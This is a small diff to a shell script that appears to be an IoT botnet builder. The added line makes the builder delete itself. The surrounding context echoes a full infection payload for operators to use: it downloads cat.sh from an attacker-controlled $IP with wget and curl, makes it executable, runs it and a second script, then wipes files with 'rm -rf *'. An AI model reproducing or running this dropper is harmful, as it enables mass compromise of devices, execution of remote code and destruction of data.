@@ -124,4 +124,5 @@ echo "THIS COMPILER IS NOT RECOMMENDED"
 echo "Your payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://$IP/cat.sh; curl -O http://$IP/cat.sh; chmod 777 cat.sh; sh cat.sh; sh cat1.sh; rm -rf *"
 echo "if your port aint default 80 its not my problem do it manually urself thats just too much work for me, if you dont know what this is and just got a fresh vps you can ignore this message"
 
+rm -rf legacybotbuilder.sh
 exit 0
